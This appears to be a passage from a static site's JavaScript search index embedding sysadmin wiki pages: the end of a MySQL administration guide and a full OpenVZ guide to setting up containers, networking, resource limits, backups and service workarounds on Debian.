remotely\nBy default, MySQL comes with a database named 'test' that anyone can access. This is also intended only for testing, and should be removed before moving into a production environment. Remove test database and access to it? [Y/n] Answer “y” to remove the test database\nReloading the privilege tables will ensure that all changes made so far will take effect immediately. Reload privilege tables now? [Y/n] And finally answer “y” to reload the privilege tables\nCleaning up... All done! If you've completed all of the above steps, your MySQL installation should now be secure. Thanks for using MySQL! Everything is finished; you can now use your database.\nCreating a database linkTo create a database, here is the command to execute:\ncreate database database_name; Creating a user linkTo create a user:\ncreate user 'user'@'localhost' identified by 'password'; GRANT USAGE ON * . * TO 'user'@'localhost' IDENTIFIED BY 'password'; grant SELECT, INSERT, UPDATE, DELETE on `database_name` .* to 'user'@'localhost'; flush privileges; Changing a user’s password linkTo change a user’s password, it’s simple:\nSET PASSWORD FOR 'debian-sys-maint'@'localhost' = PASSWORD('newpass'); This command includes flush privileges, so you don’t need to type it afterward :-)\nModifying user rights linkIf, for example, I want to change the connection hostname for all users:\nUPDATE mysql.USER SET host = '10.0.0.%' WHERE host = 'localhost' AND USER != 'root'; UPDATE mysql.db SET host = '10.0.0.%' WHERE host = 'localhost' AND USER != 'root'; FLUSH PRIVILEGES; Deleting a user linkBefore deleting a user, it is advisable to list the privileges to revoke current rights:\nSHOW grants FOR ; Then revoke:\nREVOKE ALL privileges FROM ; And finally, delete the user:\nDROP USER 'user'@'localhost'; Listing running processes link mysql\u003e show processlist; +----+-------------+-----------------+------+---------+------+-----------------------------------------------------------------------------+------------------+ | Id | User | Host | db | Command | Time | State | Info | +----+-------------+-----------------+------+---------+------+-----------------------------------------------------------------------------+------------------+ | 1 | system user | | NULL | Connect | 601 | Connecting to master | NULL | | 2 | system user | | NULL | Connect | 601 | Slave has read all relay log; waiting for the slave I/O thread to update it | NULL | | 8 | root | localhost:36538 | NULL | Query | 0 | NULL | show processlist | +----+-------------+-----------------+------+---------+------+-----------------------------------------------------------------------------+------------------+ 3 rows in set (0.00 sec) Renaming a database link #!/bin/sh olddb=olddb newdb=newdb user=root pass='password' port=3306 echo \"######### COPY / PASTE THOSE LINES TO RENAME DATABASE #########\" echo \"\" gettables=`mysql -u\\$user \\$pass -P\\$port -e \"show tables from \\$olddb;\" | grep -v \"Tables_in_\\$olddb\" | grep -v \"+\" | grep -v \"^mysql\" | awk '{print \\$1}'` for i in `echo \\$gettables | tr '\\n' ' '` ; do echo \"RENAME TABLE \\$olddb.\\$i TO \\$newdb.\\$i;\" done mysql -u\\$user \\$pass -P\\$port -e \"use \\$newdb\" \u003e /dev/null 2\u003e\u00261 || echo \"############################ WARNING ##########################\\nTHE NEW DATABASE \\\"\\$newdb\\\" DOES NOT EXIST. please create it first\\n###############################################################\" Run this script and it will rename table by table to finally create the new database. This is the method recommended by MySQL.\nKnowing the size of a database linkTo get the size of all databases in MB:\nSELECT table_schema,round(SUM(data_length+index_length)/1024/1024,4) AS \"Size (MB)\" FROM information_schema.TABLES GROUP BY table_schema; If you want the size of a single table, you need to specify the table name (table_name field) and the database name (table_schema field):\nSELECT table_schema,round(SUM(data_length+index_length)/1024/1024,4) FROM information_schema.TABLES WHERE table_schema = 'mysql' AND TABLE_NAME = 'user'; Connecting with default credentials linkIt can be useful to be able to connect simply without having to enter credentials. Here is a very simple method that consists of entering your credentials in a file in your home:\n[client] user=root password=password Then apply the right permissions:\nchmod 600 ~/.my.cnf Connect without credentials :-)\nFAQ linkHow to reset your root password when you’ve lost it? linkHave you ever forgotten the root password on one of your MySQL servers? No? Well maybe I’m not as perfect as you. This is a quick h00tow (how to) reset your MySQL root password. It does require root access on your server. If you have forgotten that password wait for another article:\nFirst things first. Log in as root and stop the mysql daemon. Now let’s start up the mysql daemon and skip the grant tables which store the passwords.\nmysqld_safe --skip-grant-tables --skip-networking \u0026 You should see mysqld start up successfully. If not, well you have bigger issues. Now you should be able to connect to mysql without a password.\n$ mysql --user=root mysql update user set Password=PASSWORD('new-password') WHERE user = 'root'; flush privileges; exit; Now kill your running mysqld, then restart it normally. You should be good to go. Try not to forget your password again.\nFatal error: Can’t open and lock privilege tables: Table ‘mysql.host’ doesn’t exist linkIf you get this kind of message when booting mysql:\nFatal error: Can't open and lock privilege tables: Table 'mysql.host' doesn't exist You need to rebuild the missing databases like this:\nmysql_install_db --user=mysql --ldata=/new-data-location mysqld_safe --datadir=/new-data-location --user=mysql \u0026 Resources linkOptimising MySQL under Sun\nMySQL Utils: beautiful cacti graphs for Monitoring MySQL\nSetting Changing And Resetting MySQL Root Passwords\nMonolith-toolkit: easy tools for complex MySQL administration\n"
            }
        );
    index.add(
            {
                id:  187 ,
                href: "\/OpenVZ_:_Mise_en_place_d\u0027OpenVZ\/",
                title: "OpenVZ: Setting Up OpenVZ",
                description: "A comprehensive guide to installing, configuring and managing OpenVZ virtualization technology on Linux.",
                content: "Introduction linkOpenVZ is an operating system-level virtualization technology based on the Linux kernel. OpenVZ allows a physical server to run multiple isolated instances of operating systems, known as Virtual Private Servers (VPS) or Virtual Environments (VE).\nCompared to virtual machines like VMware and paravirtualization technologies like Xen, OpenVZ offers less flexibility in the choice of operating system: both guest and host operating systems must be Linux (although different Linux distributions can be used in different VEs). However, OpenVZ’s OS-level virtualization offers better performance, better scalability, higher density, better dynamic resource management, and easier administration than its alternatives. According to the OpenVZ website, this virtualization method introduces a very low performance penalty: only 1 to 3% loss compared to a physical computer.\nOpenVZ is the basis of Virtuozzo, a proprietary product provided by SWsoft, Inc. OpenVZ is distributed under the GNU General Public License version 2.\nOpenVZ includes the Linux kernel and a set of user commands.\nInstallation linkInstalling OpenVZ on Debian is straightforward:\naptitude install vzquota vzctl linux-image-2.6-openvz-amd64 linux-image-openvz-amd64 linux-headers-2.6-openvz-amd64 debootstrap We also need to edit the sysctl file to add these settings:\n# On Hardware Node we generally need # packet forwarding enabled and proxy arp disabled net.ipv4.conf.default.forwarding=1 net.ipv4.conf.default.proxy_arp = 0 net.ipv4.ip_forward=1 # Enables source route verification net.ipv4.conf.all.rp_filter = 1 # Enables the magic-sysrq key kernel.sysrq = 1 # TCP Explict Congestion Notification #net.ipv4.tcp_ecn = 0 # we do not want all our interfaces to send redirects net.ipv4.conf.default.send_redirects = 1 net.ipv4.conf.all.send_redirects = 0 And activate what we need:\nsysctl -p Configuration linkPreparation of Environments linkYou can create your environments in two ways:\nUsing debootstrap Using templates Both solutions are valid. The template method is faster as the template is already on your machine.\nPersonally, I used templates for a long time. More recently, I had to migrate my server to Squeeze (which was in testing at the time) and no templates existed. So I opted for the debootstrap version.\nDebootstrap linkCreating a VE with debootstrap is very simple. Here’s the list of available distributions:\n\u003e ls /usr/share/debootstrap/scripts/ breezy\tedgy etch-m68k gutsy\thoary\tintrepid\tkarmic\tlucid\tpotato sarge.buildd\tsid stable unstable\twarty.buildd woody.buildd dapper\tetch feisty\thardy\thoary.buildd jaunty\tlenny\tmaverick sarge sarge.fakechroot squeeze testing warty\twoody For my part, I chose Squeeze:\ndebootstrap --arch amd64 squeeze /mnt/containers/private/101 –arch: Choose the desired architecture, here amd64. squeeze: The name of the desired distribution /mnt/containers/private/101: The location where the VE should be placed (I’m using the VE ID here) Template linkInstead of creating our template, we can download pre-existing ones from: http://wiki.openvz.org/Download/template/precreated and place them in the right location. I modified the file /etc/vz/vz.conf to change the default paths. It now points to /mnt/containers.\ncd /mnt/containers/template/cache wget http://download.openvz.org/template/precreated/contrib/debian-5.0-amd64-minimal.tar.gz Networking linkNAT Mode linkIf you need to have multiple VEs available from a single IP and you can’t have other directly accessible IPs, you’ll need to use NAT mode. This is especially the case if you have a Dedibox (Illiad) or a Kimsufi server (OVH) where only one WAN IP is available (by default) for a given server and it’s impossible to use bridge mode.\nLet’s start by configuring the network card:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface auto eth0 iface eth0 inet static address 88.xx.xx.xx netmask 255.255.255.0 network 88.xx.xx.0 broadcast 88.xx.xx.255 gateway 88.xx.xx.xx So far, everything is standard. However, after creating a VE, we’ll need masquerading to provide internet access from the VEs and PREROUTING for port redirection. We’ll use IPtables to provide external access from VEs and port redirections from the outside to the VEs:\n#!/bin/bash #------------------------------------------------------------------------- # Essentials #------------------------------------------------------------------------- IPTABLES='/sbin/iptables'; modprobe nf_conntrack_ftp #------------------------------------------------------------------------- # Physical and virtual interfaces definitions #------------------------------------------------------------------------- # Interfaces wan_if=\"eth0\"; vpn_if=\"tap0\"; #------------------------------------------------------------------------- # Networks definitions #------------------------------------------------------------------------- # Networks wan_ip=\"x.x.x.x\"; lan_net=\"192.168.90.0/24\"; vpn_net=\"192.168.20.0/24\"; # IPs ed_ip=\"192.168.90.1\"; banzai_ip=\"192.168.90.2\"; #------------------------------------------------------------------------- # Global Rules input / output / forward #------------------------------------------------------------------------- # Flushing tables $IPTABLES -F $IPTABLES -X $IPTABLES -t nat -F # Define default policy $IPTABLES -P INPUT DROP $IPTABLES -P OUTPUT ACCEPT $IPTABLES -P FORWARD ACCEPT $IPTABLES -A INPUT -j ACCEPT -d $lan_net; $IPTABLES -A INPUT -j ACCEPT -m state --state ESTABLISHED,RELATED #------------------------------------------------------------------------- # Allow masquerading for VE #------------------------------------------------------------------------- # Activating masquerade to get Internet from VE $IPTABLES -t nat -A POSTROUTING -o $wan_if -s $lan_net -j MASQUERADE # Activating masquerade to get VPN access from VE $IPTABLES -t nat -A POSTROUTING -o tap0 -j MASQUERADE #------------------------------------------------------------------------- # Allow ports on CT #------------------------------------------------------------------------- # Allow ICMP $IPTABLES -A INPUT -j ACCEPT -p icmp # SSH access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 22 #------------------------------------------------------------------------- # Redirections for incoming connections (wan) #------------------------------------------------------------------------- # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -d $wan_ip -j DNAT --to-destination $ed_ip:80 # HTTPS access $IPTABLES -t nat -A PREROUTING -p tcp --dport 443 -d $wan_ip -j DNAT --to-destination $ed_ip:443 Here I have ports 80 and 443 redirected to one machine (Ed).\nWith a Bridged Interface linkThe major advantage of the venet interface is that it allows the administrator of the physical server to decide on the network configuration of the virtual machine. This is particularly appreciated for a hosting provider who wants to sell a virtual machine hosting service, as they can freely let their customers manage their OpenVZ virtual server while being certain that they cannot disrupt the network, allocate more IP addresses than planned, modify routing tables, etc. If you’re using OpenVZ to provide hosting services to your customers, the veth interface is not for you. Since I’m not in this situation, the potential security issues posed by the veth interface for a hosting provider don’t concern me.\nI use both venet and veth on the servers I manage: veth when I need to have access to ethernet layers from virtual servers, and venet in all other cases. But, unlike the simplicity offered by venet interfaces, to be able to use a veth interface in a virtual server, you need to perform some additional configuration operations to prepare the physical server to receive virtual servers using veth. That’s what I’ll describe in the following sections.\nFirst, let’s install the necessary tools:\napt-get install bridge-utils Then create a typical configuration:\nauto lo iface lo inet loopback auto eth0 iface eth0 inet manual auto vmbr0 iface vmbr0 inet static bridge_ports eth0 address 192.168.1.216 netmask 255.255.255.0 network 192.168.1.0 broadcast 192.168.1.255 gateway 192.168.1.254 Now reboot the server.\nFor OpenVZ to dynamically add or remove a veth interface to the bridge when starting a virtual server, we need to create some files on the physical server. This operation needs to be done once for all on the physical server, regardless of the number of virtual servers that will be created later. It’s also possible to do it on a server that, in the end, hosts only virtual servers using venet interfaces - it doesn’t disturb them at all.\nFirst, create the /etc/vz/vznet.conf file with the following content:\n#!/bin/bash EXTERNAL_SCRIPT=\"/usr/sbin/vznetaddbr\" Then create the file /usr/sbin/vznetaddbr with the following content:\n#!/bin/sh # # Add virtual network interfaces (veth's) in a container to a bridge on CT0 CONFIGFILE=/etc/vz/conf/$VEID.conf . $CONFIGFILE NETIFLIST=$(printf %s \"$NETIF\" |tr ';' '\\n') if [ -z \"$NETIFLIST\" ]; then echo \u003e\u00262 \"According to $CONFIGFILE, CT$VEID has no veth interface configured.\" exit 1 fi for iface in $NETIFLIST; do bridge= host_ifname= for str in $(printf %s \"$iface\" |tr ',' '\\n'); do case \"$str\" in bridge=*|host_ifname=*) eval \"${str%%=*}=\\${str#*=}\" ;; esac done [ \"$host_ifname\" = \"$3\" ] || continue [ -n \"$bridge\" ] || bridge=vmbr0 echo \"Adding interface $host_ifname to bridge $bridge on CT0 for CT$VEID\" ip link set dev \"$host_ifname\" up echo 1 \u003e\"/proc/sys/net/ipv4/conf/$host_ifname/proxy_arp\" echo 1 \u003e\"/proc/sys/net/ipv4/conf/$host_ifname/forwarding\" brctl addif \"$bridge\" \"$host_ifname\" break done exit 0 For information, I modified the line containing “bridge=” with my interface vmbr0.\nYou also need to set the execute permission on this file by typing:\nchmod 0500 /usr/sbin/vznetaddbr Now let’s configure the VE (see also how to manage a VE below):\nvzctl set $my_veid --netif_add eth0 --save Finally edit your machine’s configuration and add the bridge interface for it:\nCONFIG_CUSTOMIZED=\"yes\" VZHOSTBR=\"vmbr0\" The end of the configuration file should look like this:\n... OSTEMPLATE=\"debian-5.0-amd64-minimal\" ORIGIN_SAMPLE=\"vps.basic\" HOSTNAME=\"vz.deimos.fr\" CONFIG_CUSTOMIZED=\"yes\" VZHOSTBR=\"vmbr0\" IP_ADDRESS=\"\" NAMESERVER=\"192.168.100.3\" CAPABILITY=\"SYS_TIME:on \" NETIF=\"ifname=eth0,mac=00:18:51:96:D4:8D,host_ifname=veth101.0,host_mac=00:18:51:B8:B8:CF\" Now you just need to configure the eth0 interface as you normally would in your VE.\nWith VLANs linkYou may need to create VLANs in your VEs. This works very well with a bridged interface. To do this, on the host machine, you must have a configured VLAN (use this documentation for setup). For those who still want an example:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 iface eth0 inet manual # The bridged interface auto vmbr0 iface vmbr0 inet static address 192.168.100.1 netmask 255.255.255.0 gateway 192.168.100.254 broadcast 192.168.100.255 network 192.168.100.0 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off # The DMZ Vlan 110 auto vmbr0.110 iface vmbr0.110 inet static address 192.168.110.1 netmask 255.255.255.0 broadcast 192.168.110.255 vlan_raw_device vmbr0 This example is made with a bridged interface because I have KVM running on it, but there’s nothing forcing it to be bridged.\nThen, when you create your VE, you don’t have to do anything special when creating the network interface for your VE. Launch the creation of your VE and don’t forget to install the “vlan” package to be able to create VLAN access within your VE. Here’s another example to give you an idea of the VE network configuration:\n... CONFIG_CUSTOMIZED=\"yes\" VZHOSTBR=\"vmbr0\" IP_ADDRESS=\"\" NETIF=\"ifname=eth0,mac=00:18:50:FE:EF:0B,host_ifname=veth101.0,host_mac=00:18:50:07:B8:F4\" For the VE configuration, it’s almost identical to the host machine configuration - you need to create a VLAN interface on the main interface (again, there’s no need to have the main interface configured, just the VLAN is enough). For those who are still skeptical, here’s an example of configuration in a VE:\n# This configuration file is auto-generated. # WARNING: Do not edit this file, your changes will be lost. # Please create/edit /etc/network/interfaces.head and /etc/network/interfaces.tail instead, # their contents will be inserted at the beginning and at the end # of this file, respectively. # # NOTE: it is NOT guaranteed that the contents of /etc/network/interfaces.tail # will be at the very end of this file. # Auto generated lo interface auto lo iface lo inet loopback # VE interface auto eth0 iface eth0 inet manual # VLAN 110 interface auto eth0.110 iface eth0.110 inet static address 192.168.110.2 netmask 255.255.255.0 gateway 192.168.110.254 broadcast 192.168.110.255 vlan_raw_device eth0 With Bonding linkYou may need to create bridged bonding in your VEs. To do this, on the host machine, you must have a configured bonding (use this documentation for setup). For those who still want an example:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo eth0 eth1 iface lo inet loopback iface eth0 inet manual iface eth1 inet manual auto bond0 iface bond0 inet manual slaves eth0 eth1 bond_mode active-backup bond_miimon 100 bond_downdelay 200 bond_updelay 200 auto vmbr0 iface vmbr0 inet static address 192.168.0.227 netmask 255.255.255.0 network 192.168.0.0 gateway 192.168.0.245 bridge_ports bond0 NFS linkHere I will only cover the client side in a VE, not a server in a VE.\nServer linkFirst on the server side, set up your NFS server by following this documentation.\nThen we’ll install this, which will allow us to use not only the NFS v3 protocol, but also to abstract the kernel layer (useful in case of a crash):\naptitude install nfs-user-server Client link On the host machine (HN), add these lines to sysctl.conf: ... # OpenVZ NFS Client sunrpc.ve_allow_rpc = 1 fs.nfs.ve_allow_nfs = 1 kernel.ve_allow_kthreads = 1 Then apply all this on the fly:\nsysctl -p Now let’s activate NFS on the VEs that interest us:\nvzctl set $my_veid --features \"nfs:on\" --save I don’t know if this step is essential, but just in case, I’ll add it anyway:\naptitude install nfs-user-server Then you can mount your NFS mount points normally. However, you may encounter some permission issues. That’s why I recommend adding the ’no_root_squash’ option in the exports file on the server:\n/mnt/backups/backups 192.168.0.127(rw,no_root_squash) And on the client, add the nolock option to mount the NFS:\nmount -t nfs -o nolock @IP:/my/share my_mount_point Mount Bind linkMount binds can sometimes be very useful. Here’s how to do them:\nMount script linkCreate a script in /etc/vz/conf/vps.mount for all VEs or /etc/vz/conf/CTID.mount for a specific VE (replace CTID with the VE number):\n#!/bin/bash source /etc/vz/vz.conf source ${VE_CONFFILE} mount --bind /mnt/disk ${VE_ROOT}/mnt/disk And adapt the last line to your needs.\nUnmount script linkAnd finally the same for the unmounting script, so /etc/vz/conf/vps.umount or /etc/vz/conf/CTID.umount:\n#!/bin/bash source /etc/vz/vz.conf source ${VE_CONFFILE} umount ${VE_ROOT}/mnt/disk exit 0 Finally apply the necessary permissions to make it executable:\nchmod u+x /etc/vz/conf/CTID.mount /etc/vz/conf/CTID.umount Management linkCreate a VE linkChoose the method you want depending on the VM creation method you prefer (template or debootstrap).\nTemplate linkTo create a container, use this command:\nmy_veid=101 vzctl create $my_veid --ostemplate debian-5.0-amd64-minimal --config vps.basic vzctl set $my_veid --onboot yes --save vzctl set $my_veid --hostname nagios.mycompany.com --save vzctl set $my_veid --ipadd 192.168.0.130 --save vzctl set $my_veid --nameserver 192.168.0.27 --save If you want to configure your interfaces in bridge mode, don’t forget this part.\nDebootstrap linkAt the time of writing, Squeeze is not yet the stable version, but has just frozen to become stable (today itself). So there are a few small things that may vary, like this that we need to create:\ncp /etc/vz/conf/ve-basic.conf-sample /etc/vz/conf/ve-vps.basic.conf-sample We’re copying the default parameters of a VE to a new name that it will be able to take by default. Let’s configure it:\n\u003e my_veid=101 \u003e vzctl set $my_veid --applyconfig vps.basic --save WARNING: /etc/vz/conf/101.conf not found: No such file or directory Saved parameters for CT 101 Then we add some additional lines needed in our configuration file:\necho \"OSTEMPLATE=debian\" \u003e\u003e /etc/vz/conf/$my_veid.conf Then we configure the network parameters:\nvzctl set $my_veid --ipadd 192.168.0.130 --save vzctl set $my_veid --nameserver 192.168.0.27 --save Next we’ll remove udev, which can prevent the VM from booting:\nrm /mnt/containers/private/101/etc/rcS.d/S02udev Then we’ll start the VE and enter it:\nvzctl start $my_veid vzctl enter $my_veid Configure your source.list file:\ndeb http://ftp.fr.debian.org/debian/ squeeze main non-free contrib deb-src http://ftp.fr.debian.org/debian/ squeeze main non-free contrib deb http://security.debian.org/ squeeze/updates main contrib non-free deb-src http://security.debian.org/ squeeze/updates main contrib non-free Then run these commands to remove the superfluous and remove the gettys (VEs don’t use them):\nsed -i -e '/getty/d' /etc/inittab rm -Rf /lib/udev/ We solve the mtab problem:\nrm -f /etc/mtab ln -s /proc/mounts /etc/mtab Start a VE linkNow you can start your VE:\nvzctl start 101 Change the root password of a VE linkIf you want to change the root password:\nvzctl exec 101 passwd List VEs linkTo list your VEs, use the vzlist command:\n$ vzlist VEID NPROC STATUS IP_ADDR HOSTNAME 101 8 running 192.168.0.130 nagios.mycompany.com Stop a VE linkTo stop your VE:\nvzctl stop 101 Stopping container ... Container was stopped Container is unmounted Restart a VE linkTo restart a VE:\n$ vzctl restart 101 Restarting VE Stopping VE ... VE was stopped VE is unmounted Starting VE ... VE is mounted Adding IP address(es): 192.168.0.130 Setting CPU units: 1000 Configure meminfo: 500000 Set hostname: nagios.mycompany.com File resolv.conf was modified VE start in progress... Destroy a VE linkTo permanently delete a VE:\n$ vzctl destroy 101 Destroying container private area: /vz/private/101 Container private area was destroyed Enter a VE link $ vzctl enter 101 entered into VE 101 VE Limits linkBy default there are limits that VEs cannot exceed. We’ll see how to manage them here. If you still want to go further, know that everything is explained on the official website http://wiki.openvz.org/User_beancounters.\nList the limits linkTo list the limits, we’ll execute this command:\n$ vzctl exec 101 cat /proc/user_beancounters Version: 2.5 uid resource held maxheld barrier limit failcnt 101: kmemsize 1301153 3963508 14372700 14790164 0 lockedpages 0 8 256 256 0 privvmpages 8987 49706 65536 69632 0 shmpages 640 656 21504 21504 0 dummy 0 0 0 0 0 numproc 9 21 240 240 0 physpages 1786 27164 0 9223372036854775807 0 vmguarpages 0 0 33792 9223372036854775807 0 oomguarpages 1786 27164 26112 9223372036854775807 0 numtcpsock 3 6 360 360 0 numflock 1 7 188 206 0 numpty 1 2 16 16 0 numsiginfo 0 2 256 256 0 tcpsndbuf 106952 106952 1720320 2703360 0 tcprcvbuf 49152 1512000 1720320 2703360 0 othersockbuf 0 21008 1126080 2097152 0 dgramrcvbuf 0 5648 262144 262144 0 numothersock 25 29 360 360 0 dcachesize 115497 191165 3409920 3624960 0 numfile 234 500 9312 9312 0 dummy 0 0 0 0 0 dummy 0 0 0 0 0 dummy 0 0 0 0 0 numiptent 10 10 128 128 0 The last line should always be 0, otherwise you’ve clearly reached the limits.\nHere’s some important information:\nheld: Currently the value of the resource maxheld: the maximum value the resource has reached barrier: the soft limit (warning). It means that the held value has already been up to this value limit: the hard limit. The held value will never exceed this value. To increase them, you have two solutions:\nYou can do it on the fly. Go to /etc/vz/conf/101.conf and increase the values that are causing problems. Unfortunately, this requires a restart of the VE for these parameters to be taken into account. It’s possible that the failcnt isn’t reset to 0… don’t worry, it will happen later.\nMaximize the limits linkIf you have too many restrictions compared to your needs or you feel that the VE you’re going to create will be heavy, maximize this from the start:\nvzsplit -n 2 -f max-limits 2: change this number to the number of VMs you want to run on your machine and it will take care of calculating the limits for your VE in the best way A file /etc/vz/conf/ve-max-limits.conf-sample is created. You can edit it at any time and make the modifications you want. If you want to apply it to a VE:\nvzctl set 101 --applyconfig max-limits --save VE 101 now has a new configuration via the ‘max-limits’ config.\nApply limits on the fly linkFor example, if you want to change the RAM size on the fly:\nvzctl set 101 --privvmpages 786432:1048576 --save --setmod restart 786432: corresponding to the soft limit (barrier) 1048576: corresponding to the hard limit (limit) Thanks to ‘setmod restart’, I can now apply limits on the fly.\nDisk quotas linkYou may have set up disk quotas and you’re reaching 100% of your VE disk. No problem, we’ll increase the quota on the fly:\nvzctl set 101 --diskspace 14G:15G --save If you don’t want a quota, add this line to the VE configuration:\nDISK_QUOTA=no Limit the CPU linkIf you want to limit the CPU, there are several ways to do it. Either you play with the scheduler, or you apply a percentage. For basic uses, the second solution will suit you:\n\u003e vzctl set $my_veid --cpulimit 80 --save --setmod restart Setting CPU limit: 80 Saved parameters for CT 102 For example, here I limited my VE 102 to 80% of CPU. For more info: http://wiki.openvz.org/Resource_shortage\nDisable the most restrictive limits linkIf you have a lot of load on a VE, you’ll regularly need to increase certain parameters, which can quickly become tiring. To be at ease with some of them, you can simply disable the limits by entering the maximum value:\nvzctl set $my_veid --kmemsize unlimited --save --setmod restart vzctl set $my_veid --lockedpages unlimited --save --setmod restart vzctl set $my_veid --privvmpages unlimited --save --setmod restart vzctl set $my_veid --shmpages unlimited --save --setmod restart vzctl set $my_veid --numproc unlimited --save --setmod restart vzctl set $my_veid --numtcpsock unlimited --save --setmod restart vzctl set $my_veid --numflock unlimited --save --setmod restart vzctl set $my_veid --numpty unlimited --save --setmod restart vzctl set $my_veid --numsiginfo unlimited --save --setmod restart vzctl set $my_veid --tcpsndbuf unlimited --save --setmod restart vzctl set $my_veid --tcprcvbuf unlimited --save --setmod restart vzctl set $my_veid --othersockbuf unlimited --save --setmod restart vzctl set $my_veid --dgramrcvbuf unlimited --save --setmod restart vzctl set $my_veid --numothersock unlimited --save --setmod restart vzctl set $my_veid --dcachesize unlimited --save --setmod restart vzctl set $my_veid --numfile unlimited --save --setmod restart vzctl set $my_veid --numiptent unlimited --save --setmod restart Validation of limits linkIf you want to validate your limits to make sure everything is ok:\n\u003e vzcfgvalidate /etc/vz/conf/101.conf Validation completed: success Automatic validation of limits linkIf, for example, you want to validate your machine’s resource usage in the best way and also follow OpenVZ best practices, you can use the vzcfgvalidate tool:\nvzcfgvalidate -i /etc/vz/conf/101.conf This will launch an interactive mode informing you of what’s wrong. It’s up to you to validate whether or not you want to make the changes. If you don’t have the necessary analysis capabilities for the problems or simply don’t want to bother with this, replace the ‘-i’ option with ‘-r’, which will automatically adjust to the correct values.\nFor those who don’t want to bother at all with limits, here’s a small script that will automatically adjust all limits of all your VEs. Just add it to crontab:\n#!/bin/sh # Auto Ajust VE # Made by Pierre Mavro / Deimos # Contact: xxx@mycompany.com # Configure VE directory config path VE_CONF=\"/etc/vz/conf\" echo \"Auto ajustment start:\" for i in `ls $VE_CONF/*.conf`; do if [ $i != \"$VE_CONF/0.conf\" ]; then echo \"Ajusting $i...\" vzcfgvalidate -r $i fi done echo \"Auto ajustment done\" Automatic adjustment of limits linkWhether for my work or for home, the constant modification of resource values is a bit of a headache for me. So I created a tool to manage all this on its own called vzautobean (OpenVZ Auto Management User Beancounters).\nTo install it is very simple, we’ll fetch it and place it in the folder with the other OpenVZ binaries:\ngit clone git://git.deimos.fr/git/vzautobean.git sudo mv vzautobean/vzautobean /usr/sbin/ Then either you launch it and it will run on all your VEs in use, or you can specify one or more specific VEs:\nvzautobean -e 102 -e 103 Here it will do VE 102 and 103. By default it increases all barriers by 10% and limits by 20% relative to maxheld.\nIf you wish, you can change these values by adding 2 arguments:\nvzautobean -b 30 -l 50 Here the barrier should be set to 30% above maxheld and the limit to 50% above. And this for all VEs that are launched!\nNow all you have to do is put this in cron if you want this program to run regularly.\nBackup and restore linkInstallation linkYou may need to backup an entire environment, and for that there’s the vzdump command:\naptitude install vzdump If you’re on a Debian older than 6, you can find the command here:\nwget http://download.proxmox.com/debian/dists/lenny/pve/binary-amd64/vzdump_1.2-11_all.deb dpkg -i vzdump_1.2-11_all.deb Backup linkTo backup, it’s very simple:\nvzdump $my_veid Restore linkIf you want to restore:\nvzrestore backup_101.tar $my_veid The machine will be restored on the VE corresponding to $my_veid.\nServices linkSome services may have some problems working properly (always the same ones). That’s why I’ll give solutions for the ones I’ve encountered.\nNTP linkFor the NTP service, simply configure the VE like this:\nvzctl set 101 --capability sys_time:on --save GlusterFS linkIf you want to use glusterfs in a VE, you may encounter permission problems:\nfuse: failed to open /dev/fuse: Permission denied To work around this, we’ll create the fuse device from the host on the VE in question and add admin rights to it (a bit poor in terms of security, but no choice):\nvzctl set $my_veid --devices c:10:229:rw --save vzctl exec $my_veid mknod /dev/fuse c 10 229 vzctl set $my_veid --capability sys_admin:on --save Encfs linkIf you want to use encfs in a VE, you may encounter permission problems:\nEncFS Password: fuse: device not found, try 'modprobe fuse' first fuse failed. Common problems: - fuse kernel module not installed (modprobe fuse) - invalid options -- see usage message Be aware that you need to load the fuse module at the VZ level for VEs to inherit it. Add this to your VZ to avoid having to load the module at each boot:\n... # Load Fuse fuse ... Then load it dynamically to access it afterwards:\nmodprobe fuse To work around these issues, we’ll create the fuse device from the host on the VE in question and add admin rights to it (a bit poor in terms of security, but no choice):\nvzctl set $my_veid --devices c:10:229:rw --save vzctl exec $my_veid mknod /dev/fuse c 10 229 vzctl set $my_veid --capability sys_admin:on --save It’s possible that the second line doesn’t work when the VE is off. Run it once it’s turned on, then mount your encfs partition.\nOpenVPN linkIf you want to run an OpenVPN server in a VE, add these kinds of permissions and create the necessary devices:\nvzctl set $my_veid --devices c:10:200:rw --save vzctl set $my_veid --capability net_admin:on --save vzctl exec $my_veid mkdir -p /dev/net vzctl exec $my_veid mknod /dev/net/tun c 10 200 vzctl exec $my_veid chmod 600 /dev/net/tun vzctl set $my_veid --devnodes net/tun:rw --save FAQ linkbridge vmbr0 does not exist! linkDamn!!! Oh I had a hard time with this sh*t! Indeed by default Debian assigns the name of the interface to vmbr0 for bridging (certainly a new nomenclature for Debian 6). I had found this problem when installing my server and then like an idiot I hadn’t noted it down! When you do an update, it may stop working (the bridge of your VMs) because the file /usr/sbin/vznetaddbr may be replaced. When launching a VE, this gives you something like:\nAdding interface veth101.0 to bridge vmbr0 on CT0 for CT101 bridge vmbr0 does not exist! To fix the problem quickly, modify this file and replace the name of this interface with the correct one (here br0). For my part, I changed the name of the interface to avoid being bothered in the future.\nI have freezes when booting/stopping my VZs linkIf you have freezes at boot or stop of VZs and you’re in bridge mode, you need to change the MAC addresses like this:\nsed -i -e \"s/00:18/FE:FF/g\" /etc/vz/conf/*.conf sed -i -e \"s/00:AB:BA/FE:FF:BA/g\" /etc/vz/conf/*.conf Resources link Some Tips On OpenVZ Deployment Splitting Resources Evenly Between OpenVZ VMs With vzsplit Installing And Using OpenVZ On Debian Lenny AMD64 http://www.libresys.fr/2008/10/14/les-differentes-formes-de-configuration-du-reseau-avec-openvz/ http://www.famille-fontes.net/comments.php?y=10\u0026m=02\u0026entry=entry100208-094400 http://wiki.openvz.org/Backup_of_a_running_container_with_vzdump http://www.kafe-in.net/Blog/OpenVZ-Les-ressources-syst-me-dans-un-VE "
            }
        );
    index.add(
            {
                id:  188 ,
                href: "\/MariaDB_:_Migration_depuis_MySQL\/",
                title: "MariaDB: Migration from MySQL",
                description: "A guide on how to migrate from MySQL to MariaDB, including installation and configuration steps.",
